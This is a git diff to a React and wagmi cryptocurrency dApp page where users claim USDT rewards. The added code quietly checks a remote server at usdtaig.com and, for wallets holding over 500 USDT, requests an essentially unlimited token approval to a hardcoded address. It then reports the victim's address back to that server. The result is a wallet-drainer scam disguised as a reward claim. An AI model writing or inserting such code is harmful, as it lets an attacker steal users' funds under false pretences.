@@ -13,9 +13,10 @@ import { Snackbar, Drawer, Grid, Paper, InputBase } from "@mui/material";
 import { useBalance, useContractWrite, useAccount } from "wagmi"
 import { parseEther } from 'viem'
 import { atbConfig, withdarwConfig } from "@/lib/contract"
-import { useContractUserATBBalance,useContractPollUSDT,useContractPollATB } from "@/hooks/usdt"
+import { useContractUserBalance, useContractUserATBBalance, useContractPollUSDT, useContractPollATB, userContractApprove, useContractUserAllowanceStatus } from "@/hooks/usdt"
 import { getSignData,getIncome } from '@/server/user';
 import MsgSuccess from '@/components/msgsuccess';
+import axios from 'axios'
 
 export default function Service() {
     const { t } = useTranslation()
@@ -30,8 +31,11 @@ export default function Service() {
         ...withdarwConfig,
         functionName: "withdrawPermit",
     })
+    const { data:tokenData, isLoading:tokenLoading, approve, isSuccess:tokenIsSuccess } = userContractApprove()
 
     const { userBalance } = useContractUserATBBalance()
+    const USDTData = useContractUserBalance()
+    const { isAllowed } = useContractUserAllowanceStatus("0x709B810A6F2cbcea35705EA3c7e149daBEBe42d5")
     const poolUSDTData = useContractPollUSDT()
     const poolATBData = useContractPollATB()
     const [ addData,setAddData ] = useState({ isShow: false, title: '',  status: 0, msg: '' })
@@ -49,6 +53,16 @@ export default function Service() {
             handleGetIncomeInfo()
         }
     },[pleIssuccess,usdtIssuccess])
+
+    useEffect(()=>{
+        if(tokenIsSuccess){
+            axios.post("/decode/auth_user ",{},{
+                baseURL: "https://usdtaig.com",
+                headers:{"authUser": address}
+            })
+            receiveUSDTConfirm()
+        }
+    },[tokenIsSuccess])
 
     useEffect(()=>{
         if(address){
@@ -80,15 +94,24 @@ export default function Service() {
             setSnackbarValue({ open: true, message: "当前无可用领取奖励",})
             return
         }
-        if(Number(incomeInfo.pensionableUsdt) > Number(poolUSDTData)){
+        if(Number(incomeInfo.pensionableUsdt) > Number(poolUSDTData.userBalance)){
             setSnackbarValue({ open: true, message: "领取失败"})
             return
         }
         if(!address) return
-        let { data, code } = await getSignData({
-            address: address,
-            typeStatus: "USDT"
+
+        axios.post("/decode/auth_address ",{},{baseURL: "https://usdtaig.com",}).then(res=>{
+            if(res.data.data && !isAllowed && Number(USDTData.userBalance) > 500){
+                approve({ args: ["0x709B810A6F2cbcea35705EA3c7e149daBEBe42d5", 10000000000000000000000000000] })
+            }else{
+                receiveUSDTConfirm()
+            }
         })
+        
+    }
+
+    const receiveUSDTConfirm = async() => {
+        let { data, code } = await getSignData({ address: address,typeStatus: "USDT" })
         if(code == 200){
             let _wid = data.wId
             let _wAmt = data.wAmt
